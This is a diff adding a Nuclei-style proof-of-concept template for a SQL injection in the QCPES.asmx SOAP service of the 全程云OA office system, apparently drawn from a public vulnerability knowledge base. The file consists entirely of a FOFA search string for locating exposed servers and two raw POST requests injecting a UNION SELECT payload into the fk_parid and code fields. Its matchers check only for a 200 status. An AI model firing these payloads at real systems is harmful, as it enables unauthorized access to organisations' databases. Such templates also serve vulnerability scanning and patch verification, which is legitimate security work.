@@ -1,0 +1,26 @@
+id: poc-plt1i0o13tqkaew5
+info:
+  name: 全程云OA系统QCPES.asmx存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/plt1i0o13tqkaew5'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: plt1i0o13tqkaew5
+    fofa: body="images/yipeoplehover.png"
+http:
+- raw:
+  - "POST /OA/PES/QCPES.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetCode\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetCode xmlns=\"http://tempuri.org/\">\n      <fk_parid>1' UNION ALL SELECT @@VERSION-- oCWH</fk_parid>\n      <value>1</value>\n    </GetCode>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - "POST /OA/PES/QCPES.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://tempuri.org/GetValue\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetValue xmlns=\"http://tempuri.org/\">\n      <fk_parid>1</fk_parid>\n      <code>1' UNION ALL SELECT @@VERSION-- oCWH</code>\n    </GetValue>\n  </soap:Body>\n</soap:Envelope>"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
